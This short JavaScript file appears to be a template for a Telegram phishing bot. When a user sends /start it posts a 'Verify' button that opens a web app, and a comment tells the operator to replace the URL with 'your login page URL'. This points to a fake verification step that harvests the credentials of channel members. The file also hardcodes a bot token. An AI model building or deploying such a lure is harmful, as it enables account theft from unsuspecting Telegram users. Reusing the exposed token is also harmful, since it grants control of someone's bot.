const { Telegraf } = require('telegraf');
const axios = require('axios');

const bot = new Telegraf('8117515930:AAGrh_J_UQNDKqLD_H3Gy_FWmiUS3Dpw3_M');

// "Verify" button in channels
bot.command('start', (ctx) => {
  ctx.reply('Click to verify:', {
    reply_markup: {
      inline_keyboard: [
        [{
          text: 'Verify',
          web_app: { url: 'https://web.telegram.org/a/' } // Replace with your login page URL
        }]
      ]
    }
  });
});

bot.launch();
